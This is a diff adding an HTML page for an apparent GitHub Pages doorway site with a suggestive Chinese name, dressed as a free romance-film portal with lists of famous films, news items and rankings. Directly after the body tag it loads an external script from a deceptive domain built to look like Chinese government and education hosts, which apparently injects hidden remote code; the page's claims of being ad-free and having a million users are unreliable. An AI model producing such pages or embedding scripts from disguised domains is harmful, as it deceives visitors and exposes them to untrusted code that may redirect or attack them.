@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本伦理电影网 - 高清爱情电影在线观看</title>
+<meta name="description" content="日本伦理电影网(ribenlunlidianyingwang-app.github.io)提供最新最热的爱情电影、浪漫喜剧、青春爱情片在线观看与下载，精选高分佳作，满足你的观影需求。">
+<meta name="keywords" content="日本伦理电影网,爱情电影,好看的电影,在线观看,高清电影,ribenlunlidianyingwang-app.github.io">
+<style>
+/* 全局样式 - 暗黑电影风格 */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+    background-color: #0f0f0f;
+    color: #e0e0e0;
+    line-height: 1.6;
+}
+
+a {
+    text-decoration: none;
+    color: #ff4757;
+    transition: color 0.3s;
+}
+
+a:hover {
+    color: #ff6b81;
+}
+
+/* 头部导航 */
+header {
+    background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+    padding: 1rem 0;
+    position: fixed;
+    width: 100%;
+    top: 0;
+    z-index: 1000;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 1rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+.logo {
+    font-size: 1.5rem;
+    font-weight: bold;
+    color: #ff4757;
+    text-shadow: 0 0 10px rgba(255,71,87,0.3);
+}
+
+.logo span {
+    color: #dfe6e9;
+}
+
+nav ul {
+    list-style: none;
+    display: flex;
+    gap: 1rem;
+}
+
+nav ul li a {
+    color: #dfe6e9;
+    font-size: 0.95rem;
+    padding: 0.5rem 0.8rem;
+    border-radius: 4px;
+}
+
+nav ul li a:hover {
+    background-color: rgba(255,71,87,0.1);
+    color: #ff4757;
+}
+
+/* 主内容区 */
+main {
+    margin-top: 80px;
+    padding: 2rem 1rem;
+    max-width: 1200px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+/* 栏目通用样式 */
+.section {
+    margin-bottom: 3rem;
+    padding: 2rem;
+    background: #1a1a1a;
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    border-left: 4px solid #ff4757;
+}
+
+.section h2 {
+    font-size: 1.8rem;
+    margin-bottom: 1.5rem;
+    color: #ff4757;
+    border-bottom: 1px solid #333;
+    padding-bottom: 0.5rem;
+}
+
+.section p {
+    margin-bottom: 1rem;
+    color: #b2bec3;
+}
+
+/* 电影卡片网格 */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 1.5rem;
+    margin-top: 1.5rem;
+}
+
+.movie-card {
+    background: #2d2d2d;
+    border-radius: 8px;
+    overflow: hidden;
+    transition: transform 0.3s, box-shadow 0.3s;
+    cursor: pointer;
+}
+
+.movie-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 20px rgba(255,71,87,0.2);
+}
+
+.movie-poster {
+    width: 100%;
+    height: 280px;
+    background: linear-gradient(45deg, #ff4757, #ff6b81);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 1.2rem;
+    text-align: center;
+    padding: 1rem;
+}
+
+.movie-info {
+    padding: 1rem;
+}
+
+.movie-info h3 {
+    font-size: 1rem;
+    margin-bottom: 0.5rem;
+    color: #dfe6e9;
+}
+
+.movie-info p {
+    font-size: 0.85rem;
+    color: #95a5a6;
+}
+
+/* 资讯列表 */
+.news-list {
+    list-style: none;
+}
+
+.news-list li {
+    padding: 1rem;
+    border-bottom: 1px solid #333;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.news-list li:last-child {
+    border-bottom: none;
+}
+
+.news-list li a {
+    color: #dfe6e9;
+    flex: 1;
+}
+
+.news-list li a:hover {
+    color: #ff4757;
+}
+
+.news-date {
+    color: #7f8c8d;
+    font-size: 0.85rem;
+    margin-left: 1rem;
+}
+
+/* 排行榜 */
+.rank-list {
+    counter-reset: rank;
+    list-style: none;
+}
+
+.rank-list li {
+    padding: 1rem;
+    margin-bottom: 0.5rem;
+    background: #2d2d2d;
+    border-radius: 6px;
+    display: flex;
+    align-items: center;
+    position: relative;
+    overflow: hidden;
+}
+
+.rank-list li::before {
+    counter-increment: rank;
+    content: counter(rank);
+    width: 30px;
+    height: 30px;
+    background: #ff4757;
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    margin-right: 1rem;
+    flex-shrink: 0;
+}
+
+.rank-list li:nth-child(1)::before { background: #e74c3c; }
+.rank-list li:nth-child(2)::before { background: #e67e22; }
+.rank-list li:nth-child(3)::before { background: #f1c40f; }
+
+.rank-list li a {
+    color: #dfe6e9;
+    flex: 1;
+}
+
+.rank-list li a:hover {
+    color: #ff4757;
+}
+
+/* 关于我们 */
+.about-content {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 2rem;
+    align-items: center;
+}
+
+.about-text p {
+    margin-bottom: 1rem;
+}
+
+.about-stats {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 1rem;
+}
+
+.stat-box {
+    background: #2d2d2d;
+    padding: 1.5rem;
+    border-radius: 8px;
+    text-align: center;
+}
+
+.stat-box h3 {
+    font-size: 2rem;
+    color: #ff4757;
+    margin-bottom: 0.5rem;
+}
+
+.stat-box p {
+    color: #95a5a6;
+    font-size: 0.9rem;
+}
+
+/* 页脚 */
+footer {
+    background: #1a1a1a;
+    padding: 2rem 1rem;
+    text-align: center;
+    border-top: 1px solid #333;
+    margin-top: 3rem;
+}
+
+footer p {
+    color: #7f8c8d;
+    margin-bottom: 0.5rem;
+}
+
+footer a {
+    color: #ff4757;
+}
+
+/* 移动端适配 */
+@media (max-width: 768px) {
+    .nav-container {
+        flex-direction: column;
+        gap: 1rem;
+    }
+    
+    nav ul {
+        flex-wrap: wrap;
+        justify-content: center;
+    }
+    
+    main {
+        margin-top: 120px;
+        padding: 1rem;
+    }
+    
+    .section {
+        padding: 1.5rem;
+    }
+    
+    .section h2 {
+        font-size: 1.5rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 1rem;
+    }
+    
+    .movie-poster {
+        height: 200px;
+        font-size: 1rem;
+    }
+    
+    .about-content {
+        grid-template-columns: 1fr;
+    }
+    
+    .about-stats {
+        grid-template-columns: repeat(2, 1fr);
+    }
+    
+    .news-list li {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 0.5rem;
+    }
+    
+    .news-date {
+        margin-left: 0;
+    }
+}
+
+@media (max-width: 480px) {
+    .logo {
+        font-size: 1.2rem;
+    }
+    
+    nav ul li a {
+        font-size: 0.85rem;
+        padding: 0.4rem 0.6rem;
+    }
+    
+    .section {
+        padding: 1rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+    
+    .about-stats {
+        grid-template-columns: 1fr;
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+    <div class="nav-container">
+        <div class="logo">日本伦理<span>电影网</span></div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#movies">爱情电影</a></li>
+                <li><a href="#news">电影资讯</a></li>
+                <li><a href="#rank">排行榜</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<main>
+    <!-- 首页栏目 -->
+    <section id="home" class="section">
+        <h2>欢迎来到日本伦理电影网</h2>
+        <p>日本伦理电影网（<strong>ribenlunlidianyingwang-app.github.io</strong>）是您专属的爱情电影天堂。我们精心收集了全球最感人的爱情故事，从经典老片到最新上映，从浪漫喜剧到虐心悲剧，应有尽有。</p>
+        <p>在这里，您可以免费在线观看高清爱情电影，感受每一帧画面带来的心动与感动。网站每日更新，确保您第一时间看到最新最热的爱情佳作。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">泰坦尼克号<br>1997</div>
+                <div class="movie-info">
+                    <h3>泰坦尼克号</h3>
+                    <p>经典爱情 / 9.5分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">罗马假日<br>1953</div>
+                <div class="movie-info">
+                    <h3>罗马假日</h3>
+                    <p>浪漫爱情 / 9.1分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">怦然心动<br>2010</div>
+                <div class="movie-info">
+                    <h3>怦然心动</h3>
+                    <p>青春爱情 / 9.2分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">爱在黎明破晓前<br>1995</div>
+                <div class="movie-info">
+                    <h3>爱在黎明破晓前</h3>
+                    <p>文艺爱情 / 8.8分</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 爱情电影栏目 -->
+    <section id="movies" class="section">
+        <h2>爱情电影库</h2>
+        <p>探索我们庞大的爱情电影数据库，按类型、地区、年代筛选您最爱的影片。所有资源均经过精心整理，提供高清在线观看。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">你的名字<br>2016</div>
+                <div class="movie-info">
+                    <h3>你的名字</h3>
+                    <p>日本动画 / 8.9分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">暖暖内含光<br>2004</div>
+                <div class="movie-info">
+                    <h3>暖暖内含光</h3>
+                    <p>奇幻爱情 / 8.7分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">恋恋笔记本<br>2004</div>
+                <div class="movie-info">
+                    <h3>恋恋笔记本</h3>
+                    <p>剧情爱情 / 8.5分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">傲慢与偏见<br>2005</div>
+                <div class="movie-info">
+                    <h3>傲慢与偏见</h3>
+                    <p>古典爱情 / 8.6分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">初恋这件小事<br>2010</div>
+                <div class="movie-info">
+                    <h3>初恋这件小事</h3>
+                    <p>泰国青春 / 8.8分</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">北京遇上西雅图<br>2013</div>
+                <div class="movie-info">
+                    <h3>北京遇上西雅图</h3>
+                    <p>国产爱情 / 7.5分</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 电影资讯栏目 -->
+    <section id="news" class="section">
+        <h2>电影资讯</h2>
+        <p>最新爱情电影动态、影评、幕后花絮，一网打尽。</p>
+        <ul class="news-list">
+            <li>
+                <a href="#">2026年最值得期待的10部爱情电影</a>
+                <span class="news-date">2026-10-01</span>
+            </li>
+            <li>
+                <a href="#">《日本伦理电影网》独家专访：导演谈新片创作</a>
+                <span class="news-date">2026-09-28</span>
+            </li>
+            <li>
+                <a href="#">经典重温：为什么《泰坦尼克号》至今仍让人落泪？</a>
+                <span class="news-date">2026-09-25</span>
+            </li>
+            <li>
+                <a href="#">全球票房最高的爱情电影TOP10</a>
+                <span class="news-date">2026-09-20</span>
+            </li>
+            <li>
+                <a href="#">爱情电影拍摄地巡礼：跟着电影去旅行</a>
+                <span class="news-date">2026-09-15</span>
+            </li>
+        </ul>
+    </section>
+
+    <!-- 排行榜栏目 -->
+    <section id="rank" class="section">
+        <h2>爱情电影排行榜</h2>
+        <p>基于用户评分和播放量生成的实时榜单，看看大家都在看什么。</p>
+        <ol class="rank-list">
+            <li><a href="#">泰坦尼克号 (1997) - 9.5分</a></li>
+            <li><a href="#">罗马假日 (1953) - 9.1分</a></li>
+            <li><a href="#">怦然心动 (2010) - 9.2分</a></li>
+            <li><a href="#">爱在黎明破晓前 (1995) - 8.8分</a></li>
+            <li><a href="#">你的名字 (2016) - 8.9分</a></li>
+            <li><a href="#">暖暖内含光 (2004) - 8.7分</a></li>
+            <li><a href="#">恋恋笔记本 (2004) - 8.5分</a></li>
+            <li><a href="#">傲慢与偏见 (2005) - 8.6分</a></li>
+            <li><a href="#">初恋这件小事 (2010) - 8.8分</a></li>
+            <li><a href="#">北京遇上西雅图 (2013) - 7.5分</a></li>
+        </ol>
+    </section>
+
+    <!-- 关于我们栏目 -->
+    <section id="about" class="section">
+        <h2>关于日本伦理电影网</h2>
+        <div class="about-content">
+            <div class="about-text">
+                <p><strong>日本伦理电影网</strong>（ribenlunlidianyingwang-app.github.io）成立于2024年，是一个专注于爱情电影分享的公益型网站。</p>
+                <p>我们的使命是让每一个人都能轻松找到自己喜欢的爱情电影，感受爱情的美好与力量。网站完全免费，无广告干扰，为您提供最纯净的观影体验。</p>
+                <p>如果您有任何建议或想分享您的观影感受，欢迎通过以下方式联系我们：</p>
+                <p>邮箱：<a href="mailto:contact@ribenlunlidianyingwang-app.github.io">contact@ribenlunlidianyingwang-app.github.io</a></p>
+            </div>
+            <div class="about-stats">
+                <div class="stat-box">
+                    <h3>5000+</h3>
+                    <p>爱情电影资源</p>
+                </div>
+                <div class="stat-box">
+                    <h3>100万+</h3>
+                    <p>注册用户</p>
+                </div>
+                <div class="stat-box">
+                    <h3>50+</h3>
+                    <p>合作影评人</p>
+                </div>
+                <div class="stat-box">
+                    <h3>24h</h3>
+                    <p>每日更新</p>
+                </div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<footer>
+    <p>&copy; 2026 日本伦理电影网 (ribenlunlidianyingwang-app.github.io) 版权所有</p>
+    <p>本站为个人非营利性电影推荐网站，所有资源来自互联网，如有侵权请联系删除。</p>
+    <p>网站名称：<strong>日本伦理电影网</strong> | 网址：<strong>https://ribenlunlidianyingwang-app.github.io</strong></p>
+</footer>
+
+</body>
+</html>
